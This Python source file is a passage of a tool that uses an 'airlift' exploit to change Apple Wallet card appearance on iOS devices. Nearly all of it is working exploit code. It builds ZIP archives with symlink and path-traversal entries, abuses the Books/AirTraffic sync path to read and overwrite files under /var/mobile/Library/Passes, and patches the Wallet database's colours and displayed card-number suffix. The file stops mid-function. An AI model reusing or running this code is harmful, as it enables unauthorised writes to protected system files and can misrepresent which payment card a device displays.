#!/usr/bin/env python3
"""Apply custom card skins to Apple Wallet passes using airlift exploit."""

from __future__ import annotations

import io
import json
import os
import plistlib
import posixpath
import re
import secrets
import sqlite3
import stat
import struct
import subprocess
import sys
import tempfile
import time
import zipfile
from contextlib import closing
from pathlib import Path

ROOT = Path(__file__).resolve().parent
DEVICE_HELPER = ROOT / "bin" / "device_helper" if (ROOT / "bin" / "device_helper").is_file() else ROOT / "build" / "device_helper"
AIRTRAFFIC_HOST = ROOT / "bin" / "airtraffic_host" if (ROOT / "bin" / "airtraffic_host").is_file() else ROOT / "build" / "airtraffic_host"
AIRLOCK_ROOT = "/var/mobile/Media/Airlock/Book"
SOURCE_PREFIX = "airlift-src-"
LINK_PREFIX = "airlift-link-"
RECOVERED_PREFIX = "airlift-recovered-"
SZ_EXTRA_ID = 0x5A53
CARD_HASH_RE = re.compile(r"^[A-Za-z0-9_+=-]{20,44}$")
DEFAULT_EXTRACT_LIMIT = 16 * 1024 * 1024
EXTRACT_LIMITS = {
    "passes23.sqlite": 128 * 1024 * 1024,
    "passes23.sqlite-journal": 128 * 1024 * 1024,
    "passes23.sqlite-wal": 128 * 1024 * 1024,
    "passes23.sqlite-shm": 8 * 1024 * 1024,
}
EXTRACT_ALLOWED_LEAVES = frozenset(
    {
        "cardBackgroundCombined@3x.png",
        "cardBackgroundCombined@2x.png",
        "cardBackgroundCombined.pdf",
        *EXTRACT_LIMITS,
    }
)
WALLET_DB_TARGET = "/var/mobile/Library/Passes"
WALLET_DB_LEAF = "passes23.sqlite"
WALLET_DB_SIDECARS = (
    "passes23.sqlite-journal",
    "passes23.sqlite-wal",
    "passes23.sqlite-shm",
)
WALLET_DB_UNCHANGED = object()


class WalletDBPrewriteChangedError(RuntimeError):
    """Raised when the live database no longer matches the prepared snapshot."""


class ExtractionRestoreError(RuntimeError):
    """Raised when extraction recovery cannot be verified safely."""


def zip_info(name: str, mode: int) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name, date_time=(2026, 9, 14, 5, 0, 0))
    info.create_system = 3
    info.compress_type = zipfile.ZIP_STORED
    info.external_attr = (mode & 0xFFFF) << 16
    info.extra = struct.pack("<HHH", SZ_EXTRA_ID, 2, mode & 0xFFFF)
    return info


def build_archive(target: str, payload: bytes) -> bytes:
    target_tail = target[1:]
    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in target_tail.split("/"):
            cursor += component + "/"
            archive.writestr(zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        archive.writestr(zip_info("payload", stat.S_IFREG | 0o600), payload)
    return output.getvalue()


def build_archive_multi(target: str, files: list[tuple[str, bytes]]) -> bytes:
    target_tail = target.lstrip("/")
    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in target_tail.split("/"):
            if not component:
                continue
            cursor += component + "/"
            archive.writestr(zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        for idx, (_leaf, payload) in enumerate(files):
            archive.writestr(zip_info(f"payload_{idx}", stat.S_IFREG | 0o600), payload)
        if files:
            archive.writestr(zip_info("payload", stat.S_IFREG | 0o600), files[0][1])
    return output.getvalue()


def build_books(identifiers: list[str]) -> bytes:
    rows = [
        {"Persistent ID": identifier, "Item ID": str(index), "DSID": "1"}
        for index, identifier in enumerate(identifiers, 1)
    ]
    return plistlib.dumps({"Books": rows}, fmt=plistlib.FMT_BINARY, sort_keys=True)


def run_json(command: list[str], timeout: int) -> dict:
    completed = subprocess.run(
        command,
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=timeout,
    )
    result = None
    for line in reversed(completed.stdout.splitlines()):
        try:
            val = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(val, dict):
            result = val
            break
    if result is None:
        raise RuntimeError(f"{Path(command[0]).name} failed: {completed.stderr}")
    result["exitCode"] = completed.returncode
    return result


def run_json_streaming(command: list[str], timeout: int, on_progress=None) -> dict:
    proc = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1,
    )
    result = None
    try:
        if proc.stdout:
            for line in iter(proc.stdout.readline, ""):
                line_str = line.strip()
                if not line_str:
                    continue
                try:
                    val = json.loads(line_str)
                    if isinstance(val, dict):
                        if val.get("type") == "atc_progress" and on_progress:
                            on_progress(val)
                        result = val
                except json.JSONDecodeError:
                    pass
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.kill()
        raise TimeoutError(f"{Path(command[0]).name} timed out after {timeout}s")

    if result is None:
        stderr = proc.stderr.read() if proc.stderr else ""
        raise RuntimeError(f"{Path(command[0]).name} failed: {stderr}")
    result["exitCode"] = proc.returncode
    return result


def native(command: str, udid: str, *arguments: str) -> dict:
    return run_json(
        [os.fspath(DEVICE_HELPER), command, udid, *arguments], timeout=60
    )


def operation_ok(result: dict) -> bool:
    return bool(
        result.get("exitCode") == 0
        and result.get("targetGatePassed")
        and result.get("operation", {}).get("ok")
    )


def validate_card_hash(card_hash: str) -> None:
    if not CARD_HASH_RE.fullmatch(card_hash):
        raise ValueError("invalid card hash")


def write_file(udid: str, target: str, leaf: str, payload: bytes, retries: int = 3) -> bool:
    for attempt in range(1, max(1, retries) + 1):
        try:
            token = secrets.token_hex(10)
            source = f"{SOURCE_PREFIX}{token}"
            link_destination = f"{LINK_PREFIX}{token}"
            recovered = f"{RECOVERED_PREFIX}{token}"

            link_identifier = f"../../{source}/p0/p1/p2/link"
            payload_identifier = f"../../{source}/payload"
            cleanup_attempted = False
            finish: dict = {}

            # Step 1: move link to media
            # Step 2: move new payload into link/leaf (atomically creates or overwrites target)
            identifiers = [link_identifier, payload_identifier]
            destinations = [
                link_destination,
                posixpath.join(link_destination, leaf),
            ]

            with tempfile.TemporaryDirectory(prefix="airlift-write-") as temporary:
                work = Path(temporary)
                archive_path = work / "payload.zip"
                books_path = work / "Books.plist"
                snapshot_root = work / "books-snapshot"
                snapshot_root.mkdir()

                archive_path.write_bytes(build_archive(target, payload))
                books_path.write_bytes(build_books(identifiers))

                snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
                if not operation_ok(snapshot):
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return False

                atc: dict = {}
                try:
                    cleanup_attempted = True
                    stage = native(
                        "stage",
                        udid,
                        source,
                        link_destination,
                        recovered,
                        os.fspath(archive_path),
                        os.fspath(books_path),
                        os.fspath(snapshot_root),
                    )
                    if not operation_ok(stage):
                        atc = {}
                    else:
                        atc_cmd = [os.fspath(AIRTRAFFIC_HOST), udid]
                        for identifier, destination in zip(identifiers, destinations):
                            atc_cmd.extend((identifier, destination))
                        atc = run_json(atc_cmd, timeout=120)
                finally:
                    if cleanup_attempted:
                        try:
                            finish = native(
                                "finish-write",
                                udid,
                                source,
                                link_destination,
                                recovered,
                                os.fspath(snapshot_root),
                            )
                        except Exception:
                            finish = {}

            if cleanup_attempted and not operation_ok(finish):
                return False
            ok = bool(atc.get("exitCode") == 0 and atc.get("ok"))
            if ok:
                return True
        except Exception:
            if cleanup_attempted and not operation_ok(finish):
                return False
            pass

        if attempt < retries:
            time.sleep(0.3 * attempt)

    return False


def write_files_batch(
    udid: str,
    target: str,
    files: list[tuple[str, bytes]],
    retries: int = 3,
    progress_callback=None,
) -> bool:
    if not files:
        return True

    for attempt in range(1, max(1, retries) + 1):
        try:
            token = secrets.token_hex(10)
            source = f"{SOURCE_PREFIX}{token}"
            link_destination = f"{LINK_PREFIX}{token}"
            recovered = f"{RECOVERED_PREFIX}{token}"
            cleanup_attempted = False
            finish: dict = {}

            link_identifier = f"../../{source}/p0/p1/p2/link"
            identifiers = [link_identifier]
            destinations = [link_destination]

            for idx, (leaf, _) in enumerate(files):
                identifiers.append(f"../../{source}/payload_{idx}")
                destinations.append(posixpath.join(link_destination, leaf))

            with tempfile.TemporaryDirectory(prefix="airlift-batch-") as temporary:
                work = Path(temporary)
                archive_path = work / "payload.zip"
                books_path = work / "Books.plist"
                snapshot_root = work / "books-snapshot"
                snapshot_root.mkdir()

                archive_path.write_bytes(build_archive_multi(target, files))
                books_path.write_bytes(build_books(identifiers))

                snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
                if not operation_ok(snapshot):
                    if attempt < retries:
                        time.sleep(0.4 * attempt)
                        continue
                    return False

                atc: dict = {}
                try:
                    cleanup_attempted = True
                    stage = native(
                        "stage",
                        udid,
                        source,
                        link_destination,
                        recovered,
                        os.fspath(archive_path),
                        os.fspath(books_path),
                        os.fspath(snapshot_root),
                    )
                    if not operation_ok(stage):
                        atc = {}
                    else:
                        atc_cmd = [os.fspath(AIRTRAFFIC_HOST), udid]
                        for identifier, destination in zip(identifiers, destinations):
                            atc_cmd.extend((identifier, destination))

                        timeout = max(120, len(files) * 2)
                        if progress_callback:
                            atc = run_json_streaming(
                                atc_cmd,
                                timeout=timeout,
                                on_progress=progress_callback,
                            )
                        else:
                            atc = run_json(atc_cmd, timeout=timeout)
                finally:
                    if cleanup_attempted:
                        try:
                            finish = native(
                                "finish-write",
                                udid,
                                source,
                                link_destination,
                                recovered,
                                os.fspath(snapshot_root),
                            )
                        except Exception:
                            finish = {}

            if cleanup_attempted and not operation_ok(finish):
                return False
            ok = bool(atc.get("exitCode") == 0 and atc.get("ok"))
            if ok:
                return True
        except Exception:
            if cleanup_attempted and not operation_ok(finish):
                return False
            pass

        if attempt < retries:
            time.sleep(0.4 * attempt)

    return False


def extract_file(
    udid: str,
    target: str,
    leaf: str,
    output_path: str,
    retries: int = 3,
    raise_errors: bool = False,
) -> bytes | None:
    """Read one existing device file, restoring all staging state afterward."""
    normalized_target = posixpath.normpath(target)
    if (
        leaf not in EXTRACT_ALLOWED_LEAVES
        or (
            normalized_target != WALLET_DB_TARGET
            and not normalized_target.startswith(f"{WALLET_DB_TARGET}/")
        )
    ):
        raise ValueError("unsupported extraction target")
    target = normalized_target
    target_path = posixpath.join(target, leaf)
    last_error: Exception | None = None
    for attempt in range(1, max(1, retries) + 1):
        token = secrets.token_hex(10)
        source = f"{SOURCE_PREFIX}{token}"
        link_destination = f"{LINK_PREFIX}{token}"
        recovered = f"{RECOVERED_PREFIX}{token}"
        link_identifier = f"../../{source}/p0/p1/p2/link"
        target_identifier = posixpath.relpath(target_path, AIRLOCK_ROOT)
        canary = f"airlift extract\nnonce={secrets.token_hex(24)}\n".encode()

        try:
            with tempfile.TemporaryDirectory(prefix="airlift-extract-") as temporary:
                work = Path(temporary)
                archive_path = work / "payload.zip"
                books_path = work / "Books.plist"
                snapshot_root = work / "books-snapshot"
                output = Path(output_path)
                snapshot_root.mkdir()
                archive_path.write_bytes(build_archive(target, canary))
                books_path.write_bytes(build_books([link_identifier, target_identifier]))
                cleanup_attempted = False
                staging_cleanup_complete = False
                relocation_attempted = False
                target_missing = False
                recovery_complete = False
                recovery_detail = "restore was not attempted"
                extracted_data: bytes | None = None

                snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
                if not operation_ok(snapshot):
                    raise RuntimeError("failed to snapshot Books state")

                try:
                    cleanup_attempted = True
                    stage = native(
                        "stage",
                        udid,
                        source,
                        link_destination,
                        recovered,
                        os.fspath(archive_path),
                        os.fspath(books_path),
                        os.fspath(snapshot_root),
                    )
                    if not operation_ok(stage):
                        raise RuntimeError("failed to stage extraction")

                    relocation_attempted = True
                    atc = run_json(
                        [
                            os.fspath(AIRTRAFFIC_HOST),
                            udid,
                            link_identifier,
                            link_destination,
                            target_identifier,
                            recovered,
                        ],
                        timeout=120,
                    )
                    if atc.get("exitCode") != 0 or not atc.get("ok"):
                        if (
                            atc.get("exitCode") == 5
                            and atc.get("missingCount") == 1
                        ):
                            target_missing = True
                            raise FileNotFoundError(
                                f"{leaf} file not found"
                            )
                        raise RuntimeError(
                            f"AirTraffic failed to extract {leaf}"
                        )

                    extracted = native(
                        "extract", udid, recovered, leaf, os.fspath(output)
                    )
                    if not operation_ok(extracted):
                        reason = extracted.get("operation", {}).get(
                            "reason", "AFC extraction failed"
                        )
                        if reason == "file not found":
                            if leaf in WALLET_DB_SIDECARS:
                                target_missing = True
                            raise FileNotFoundError(
                                f"{leaf} file not found"
                            )
                        raise RuntimeError(reason)

                    extracted_data = output.read_bytes()
                    size_limit = EXTRACT_LIMITS.get(leaf, DEFAULT_EXTRACT_LIMIT)
                    empty_allowed = leaf in {
                        "passes23.sqlite-journal",
                        "passes23.sqlite-wal",
                        "passes23.sqlite-shm",
                    }
                    if (
                        (not extracted_data and not empty_allowed)
                        or len(extracted_data) > size_limit
                    ):
                        raise RuntimeError(
                            f"extracted {leaf} is empty or too large"
                        )

                finally:
                    if (
                        cleanup_attempted
                        and relocation_attempted
                        and extracted_data is not None
                    ):
                        try:
                            finish = native(
                                "finish-extract",
                                udid,
                                source,
                                link_destination,
                                recovered,
                                os.fspath(snapshot_root),
                            )
                            staging_cleanup_complete = operation_ok(finish)
                            if staging_cleanup_complete:
                                recovery_complete = write_file(
                                    udid,
                                    target,
                                    leaf,
                                    extracted_data,
                                    retries=1,
                                )
                            recovery_detail = (
                                "rewrite completed"
                                if recovery_complete
                                else "cleanup or rewrite failed"
                            )
                        except Exception as error:
                            recovery_detail = (
                                f"{type(error).__name__}: {error}"
                            )
                    elif (
                        cleanup_attempted
                        and relocation_attempted
                        and target_missing
                    ):
                        try:
                            finish = native(
                                "finish-extract",
                                udid,
                                source,
                                link_destination,
                                recovered,
                                os.fspath(snapshot_root),
                            )
                            staging_cleanup_complete = operation_ok(finish)
                            recovery_complete = bool(
                                finish.get("operation", {}).get(
                                    "recoveredAbsent"
                                )
                            )
                        except Exception:
                            staging_cleanup_complete = False
                            recovery_complete = False
                    if relocation_attempted and not recovery_complete:
                        raise ExtractionRestoreError(
                            f"failed to restore original {leaf}: "
                            f"{recovery_detail}"
                        )
                    if cleanup_attempted and not staging_cleanup_complete:
                        raise ExtractionRestoreError(
                            "failed to restore extraction staging state"
                        )
                return extracted_data
        except (OSError, RuntimeError, subprocess.SubprocessError) as error:
            last_error = error
            if (
                not isinstance(
                    error,
                    (ExtractionRestoreError, FileNotFoundError),
                )
                and attempt < retries
            ):
                time.sleep(0.3 * attempt)
                continue
            break
    if raise_errors and last_error is not None:
        if isinstance(last_error, FileNotFoundError):
            raise last_error
        raise RuntimeError(f"{leaf}: {last_error}") from last_error
    return None


def normalize_wallet_db_color(value: str) -> str:
    """Return Wallet's canonical rgba(r, g, b, 1.00) database format."""
    match = re.fullmatch(
        r"#?([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})",
        value.strip(),
    )
    if match:
        channels = tuple(int(part, 16) for part in match.groups())
        return f"rgba({channels[0]}, {channels[1]}, {channels[2]}, 1.00)"

    match = re.fullmatch(
        r"rgb\(\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d{1,3})\s*\)",
        value.strip(),
        re.IGNORECASE,
    )
    if match:
        channels = tuple(int(part) for part in match.groups())
        if all(channel <= 255 for channel in channels):
            return f"rgba({channels[0]}, {channels[1]}, {channels[2]}, 1.00)"
    raise ValueError("color must be #RRGGBB or rgb(r, g, b)")


def normalize_primary_account_suffix(value: object) -> str | None:
    """Validate an explicitly requested Wallet card-number suffix."""
    if value == "NULL":
        return None
    if not isinstance(value, str) or re.fullmatch(r"[0-9]{4}", value) is None:
        raise ValueError(
            "primary account suffix must be exactly four ASCII digits or NULL"
        )
    return value


def _wallet_db_metadata(connection: sqlite3.Connection) -> dict:
    quick_check = [
        str(row[0]) for row in connection.execute("PRAGMA quick_check")
    ]
    journal_row = connection.execute("PRAGMA journal_mode").fetchone()
    journal_mode = str(journal_row[0]).lower() if journal_row else ""
    columns = [
        str(row[1]) for row in connection.execute("PRAGMA table_info(pass)")
    ]
    required = {
        "unique_id",
        "foreground_color",
        "label_color",
        "primary_account_suffix",
    }
    missing = sorted(required.difference(columns))
    if missing:
        raise ValueError(
            "wallet database pass table is missing required columns: "
            + ", ".join(missing)
        )
    return {
        "journalMode": journal_mode,
        "quickCheck": quick_check,
        "columns": columns,
    }


def _wallet_db_card_row(
    connection: sqlite3.Connection,
    card_hash: str,
) -> tuple:
    rows = connection.execute(
        """
        SELECT foreground_color, label_color, primary_account_suffix
        FROM pass
        WHERE unique_id = ?
        """,
        (card_hash,),
    ).fetchmany(2)
    row_count = len(rows)
    if row_count != 1:
        qualifier = "at least " if row_count == 2 else ""
        raise ValueError(
            "wallet database card match count must be exactly one "
            f"(found {qualifier}{row_count})"
        )
    return rows[0]


def _inspect_wallet_db_path(database: Path, card_hash: str) -> dict:
    uri = f"{database.as_uri()}?mode=ro"
    with closing(sqlite3.connect(uri, uri=True)) as connection:
        connection.execute("PRAGMA query_only = ON")
        metadata = _wallet_db_metadata(connection)
        row = _wallet_db_card_row(connection, card_hash)

    return {
        **metadata,
        "rowCount": 1,
        "foregroundColor": row[0],
        "labelColor": row[1],
        "primaryAccountSuffix": row[2],
    }


def inspect_wallet_db_batch_bytes(
    database_bytes: bytes,
    card_hashes: list[str],
) -> list[dict]:
    """Inspect multiple card rows from one local database image."""
    if not card_hashes:
        raise ValueError("at least one Wallet database card is required")
    for card_hash in card_hashes:
        validate_card_hash(card_hash)
    if not database_bytes or len(database_bytes) > EXTRACT_LIMITS[WALLET_DB_LEAF]:
        raise ValueError("wallet database is empty or too large")
    with tempfile.TemporaryDirectory(prefix="aircard-wallet-db-local-") as temporary:
        database = Path(temporary) / WALLET_DB_LEAF
        database.write_bytes(database_bytes)
        uri = f"{database.as_uri()}?mode=ro"
        with closing(sqlite3.connect(uri, uri=True)) as connection:
            connection.execute("PRAGMA query_only = ON")
            metadata = _wallet_db_metadata(connection)
            results = []
            for card_hash in card_hashes:
                row = _wallet_db_card_row(connection, card_hash)
                results.append({
                    **metadata,
                    "rowCount": 1,
                    "foregroundColor": row[0],
                    "labelColor": row[1],
                    "primaryAccountSuffix": row[2],
                })
            return results


def inspect_wallet_db_bytes(database_bytes: bytes, card_hash: str) -> dict:
    """Validate and inspect one card from a local Wallet database."""
    return inspect_wallet_db_batch_bytes(database_bytes, [card_hash])[0]


def _normalize_wallet_db_update(
    card_hash: str,
    foreground_color: str | None,
    label_color: str | None,
    primary_account_suffix: str | None | object,
) -> dict:
    validate_card_hash(card_hash)
    updates: dict[str, str | None] = {
        column: normalize_wallet_db_color(value)
        for column, value in {
            "foreground_color": foreground_color,
            "label_color": label_color,
        }.items()
        if value is not None
    }
    if primary_account_suffix is not WALLET_DB_UNCHANGED:
        updates["primary_account_suffix"] = normalize_primary_account_suffix(
            primary_account_suffix
        )
    if not updates:
        raise ValueError("at least one Wallet database change is required")
    return updates


def patch_wallet_db_batch(original: bytes, updates: list[dict]) -> dict:
    """Patch all requested cards in one local SQLite transaction."""
    if not updates:
        raise ValueError("at least one Wallet database change is required")
    if not original or len(original) > EXTRACT_LIMITS[WALLET_DB_LEAF]:
        raise ValueError("wallet database is empty or too large")

    normalized_updates: list[dict] = []
    seen_hashes: set[str] = set()
    seen_request_indices: set[int] = set()
    allowed_keys = {
        "cardHash",
        "foregroundColor",
        "labelColor",
        "primaryAccountSuffix",
        "requestIndex",
    }
    for update in updates:
        if not isinstance(update, dict):
            raise ValueError("Wallet database updates must be objects")
        unknown_keys = set(update).difference(allowed_keys)
        if unknown_keys:
            raise ValueError(
                "unknown Wallet database update fields: "
                + ", ".join(sorted(unknown_keys))
            )
        card_hash = update.get("cardHash")
        if not isinstance(card_hash, str):
            raise ValueError("Wallet database update is missing cardHash")
        if card_hash in seen_hashes:
            raise ValueError("duplicate Wallet database card update")
        seen_hashes.add(card_hash)
        request_index = update.get("requestIndex")
        if (
            request_index is not None
            and (
                isinstance(request_index, bool)
                or not isinstance(request_index, int)
                or request_index < 0
            )
        ):
            raise ValueError("Wallet database requestIndex must be non-negative")
        if (
            request_index is not None
            and request_index in seen_request_indices
        ):
            raise ValueError("duplicate Wallet database requestIndex")
        if request_index is not None:
            seen_request_indices.add(request_index)
        normalized_updates.append({
            "cardHash": card_hash,
            "requestIndex": request_index,
            "updates": _normalize_wallet_db_update(
                card_hash,
                update.get("foregroundColor"),
                update.get("labelColor"),
                update.get("primaryAccountSuffix", WALLET_DB_UNCHANGED),
            ),
        })

    with tempfile.TemporaryDirectory(
        prefix="aircard-wallet-db-patch-"
    ) as temporary:
        database = Path(temporary) / WALLET_DB_LEAF
        database.write_bytes(original)
        cards: list[dict] = []
        with closing(
            sqlite3.connect(database, isolation_level=None)
        ) as connection:
            metadata = _wallet_db_metadata(connection)
            if metadata["journalMode"] != "delete":
                raise ValueError("wallet database journal_mode must be delete")
            if metadata["quickCheck"] != ["ok"]:
                raise ValueError(
                    "wallet database quick_check failed before update"
                )

            for update in normalized_updates:
                row = _wallet_db_card_row(connection, update["cardHash"])
                cards.append({
                    "cardHash": update["cardHash"],
                    "requestIndex": update["requestIndex"],
                    "originalColors": {
                        "foreground_color": row[0],
                        "label_color": row[1],
                        "primary_account_suffix": row[2],
                    },
                    "updates": update["updates"],
                })

            try:
                connection.execute("BEGIN IMMEDIATE")
                for card in cards:
                    assignments = ", ".join(
                        f"{column} = ?" for column in card["updates"]
                    )
                    parameters = [
                        *card["updates"].values(),
                        card["cardHash"],
                    ]
                    connection.execute(
                        f"UPDATE pass SET {assignments} WHERE unique_id = ?",
                        parameters,
                    )
                    changed = connection.execute(
                        "SELECT changes()"
                    ).fetchone()
                    if changed is None or int(changed[0]) != 1:
                        raise ValueError(
                            "wallet database update must change exactly one row"
                        )
                connection.execute("COMMIT")
            except Exception:
                if connection.in_transaction:
                    connection.execute("ROLLBACK")
                raise

            quick_check = [
                str(row[0])
                for row in connection.execute("PRAGMA quick_check")
            ]
            if quick_check != ["ok"]:
                raise ValueError(
                    "wallet database quick_check failed after update"
                )
            for card in cards:
                row = _wallet_db_card_row(connection, card["cardHash"])
                applied = {
                    "foreground_color": row[0],
                    "label_color": row[1],
                    "primary_account_suffix": row[2],
                }
                mismatches = [
                    column
                    for column, expected in card["updates"].items()
                    if applied[column] != expected
                ]
                if mismatches:
                    raise ValueError(
                        "wallet database values did not persist: "
                        + ", ".join(mismatches)
                    )
                card["appliedColors"] = applied
                del card["updates"]

        return {
            "originalBytes": original,
            "patchedBytes": database.read_bytes(),
            "cardHashes": [card["cardHash"] for card in cards],
            "cards": cards,
        }


def patch_wallet_db(
    original: bytes,
    card_hash: str,
    foreground_color: str | None = None,
    label_color: str | None = None,
    primary_account_suffix: str | None | object = WALLET_DB_UNCHANGED,
) -> dict:
    """Patch one card through the shared batch transaction."""
    batch = patch_wallet_db_batch(
        original,
        [{
            "cardHash": card_hash,
            "foregroundColor": foreground_color,
            "labelColor": label_color,
            **(
                {"primaryAccountSuffix": primary_account_suffix}
                if primary_account_suffix is not WALLET_DB_UNCHANGED
                else {}
            ),
        }],
    )
    card = batch["cards"][0]
    return {
        "originalBytes": batch["originalBytes"],
        "patchedBytes": batch["patchedBytes"],
        "originalColors": card["originalColors"],
        "appliedColors": card["appliedColors"],
    }


def _extract_optional_wallet_db_sidecar(
    udid: str,
    leaf: str,
    output: Path,
    phase: str,
) -> bytes | None:
    try:
        return extract_file(
            udid,
            WALLET_DB_TARGET,
            leaf,
            os.fspath(output),
            retries=1,
            raise_errors=True,
        )
    except FileNotFoundError:
        return None
    except Exception as error:
        raise RuntimeError(
            f"{phase}-{leaf}: {type(error).__name__}: {error}"
        ) from error


def _require_wallet_db_sidecars_absent(
    udid: str,
    work: Path,
    phase: str,
) -> None:
    for leaf in WALLET_DB_SIDECARS:
        sidecar = _extract_optional_wallet_db_sidecar(
            udid,
            leaf,
            work / leaf,
            phase,
        )
        if sidecar is not None:
            raise RuntimeError(
                f"{phase}-{leaf}: wallet database sidecar exists; "
                "refusing to write"
            )


def _extract_wallet_db_main_without_sidecars(
    udid: str,
    phase: str = "wallet-db",
) -> bytes:
    """Extract the main DB and fail unless every journal sidecar is absent."""
    with tempfile.TemporaryDirectory(
        prefix="aircard-wallet-db-device-"
    ) as temporary:
        work = Path(temporary)
        try:
            main = extract_file(
                udid,
                WALLET_DB_TARGET,
                WALLET_DB_LEAF,
                os.fspath(work / WALLET_DB_LEAF),
                retries=1,
                raise_errors=True,
            )
        except Exception as error:
            raise RuntimeError(
                f"{phase}-main: {type(error).__name__}: {error}"
            ) from error
        if main is None:
            raise RuntimeError(f"{phase}-main: wallet database is unavailable")
        _require_wallet_db_sidecars_absent(udid, work, f"{phase}-after")
        return main


def prepare_wallet_db_patch(
    udid: str,
    card_hash: str,
    foreground_color: str | None = None,
    label_color: str | None = None,
    primary_account_suffix: str | None | object = WALLET_DB_UNCHANGED,
) -> dict:
    """Extract, gate, and locally prepare a Wallet DB style patch."""
    if primary_account_suffix is not WALLET_DB_UNCHANGED:
        normalize_primary_account_suffix(primary_account_suffix)
    original = _extract_wallet_db_main_without_sidecars(udid, "prepare")
    try:
        patch = patch_wallet_db(
            original,
            card_hash,
            foreground_color,
            label_color,
            primary_account_suffix,
        )
    except Exception as error:
        raise RuntimeError(
            f"prepare-local-patch: {type(error).__name__}: {error}"
        ) from error
    patch["cardHash"] = card_hash
    return patch


def prepare_wallet_db_batch_patch(udid: str, updates: list[dict]) -> dict:
    """Extract once and prepare one final DB image for all card updates."""
    original = _extract_wallet_db_main_without_sidecars(udid, "prepare")
    try:
        return patch_wallet_db_batch(original, updates)
    except Exception as error:
        raise RuntimeError(
            f"prepare-local-patch: {type(error).__name__}: {error}"
        ) from error


def _write_wallet_db_and_verify(
    udid: str,
    replacement: bytes,
    phase: str = "apply",
) -> bytes:
    if not write_file(
        udid,
        WALLET_DB_TARGET,
        WALLET_DB_LEAF,
        replacement,
        retries=1,
    ):
        raise RuntimeError(f"{phase}-write: failed to write Wallet database")
    return _extract_wallet_db_main_without_sidecars(
        udid,
        f"{phase}-readback",
    )


def rollback_wallet_db_patch(udid: str, prepared: dict) -> None:
    """Restore only when the live bytes still equal the attempted patch."""
    original = prepared["originalBytes"]
    patched = prepared["patchedBytes"]
    try:
        current = _extract_wallet_db_main_without_sidecars(
            udid,
            "rollback-current",
        )
        if current == original:
            readback = current
        elif current == patched:
            readback = _write_wallet_db_and_verify(
                udid,
                original,
                "rollback-restore",
            )
        else:
            raise RuntimeError(
                "rollback-compare: live database changed after the attempted patch; "
                "refusing stale rollback"
            )
        if readback != original:
            raise RuntimeError(
                "rollback-byte-compare: original bytes do not match device readback"
            )
        card_hashes = prepared.get("cardHashes")
        if card_hashes is None:
            card_hashes = [prepared["cardHash"]]
        inspected_cards = inspect_wallet_db_batch_bytes(
            readback,
            card_hashes,
        )
        for inspected in inspected_cards:
            if inspected["quickCheck"] != ["ok"]:
                raise RuntimeError(
                    "rollback-quick-check: restored database quick_check failed"
                )
            if inspected["journalMode"] != "delete":
                raise RuntimeError(
                    "rollback-journal-mode: restored database journal mode changed"
                )
    except Exception as error:
        raise RuntimeError(
            "FATAL: wallet database rollback could not be verified: "
            f"{error}"
        ) from error


def apply_wallet_db_batch_patch(udid: str, prepared: dict) -> list[dict]:
    """Write one prepared DB image and verify every requested card update."""
    original = prepared["originalBytes"]
    patched = prepared["patchedBytes"]
    cards = prepared.get("cards")
    if cards is None:
        cards = [{
            "cardHash": prepared["cardHash"],
            "appliedColors": prepared["appliedColors"],
        }]

    write_attempted = False
    try:
        prewrite = _extract_wallet_db_main_without_sidecars(
            udid,
            "apply-prewrite",
        )
        if prewrite != original:
            raise WalletDBPrewriteChangedError(
                "apply-prewrite-compare: wallet database changed after "
                "preparation; refusing to write"
            )
        write_attempted = True
        readback = _write_wallet_db_and_verify(udid, patched, "apply")
        if readback != patched:
            raise RuntimeError(
                "apply-readback-compare: Wallet database readback bytes "
                "do not match"
            )
        inspected_cards = inspect_wallet_db_batch_bytes(
            readback,
            [card["cardHash"] for card in cards],
        )
        for card, inspected in zip(cards, inspected_cards):
            if inspected["journalMode"] != "delete":
                raise RuntimeError(
                    "apply-journal-mode: Wallet database journal mode changed"
                )
            expected = card["appliedColors"]
            actual = {
                "foreground_color": inspected["foregroundColor"],
                "label_color": inspected["labelColor"],
                "primary_account_suffix": inspected[
                    "primaryAccountSuffix"
                ],
            }
            mismatches = [
                column
                for column, value in expected.items()
                if actual[column] != value
            ]
            if mismatches:
                raise RuntimeError(
                    "apply-value-check: Wallet database values did not persist: "
                    + ", ".join(mismatches)
                )
        return inspected_cards
    except Exception as error:
        if (
            isinstance(error, WalletDBPrewriteChangedError)
            or not write_attempted
        ):
            raise
        try:
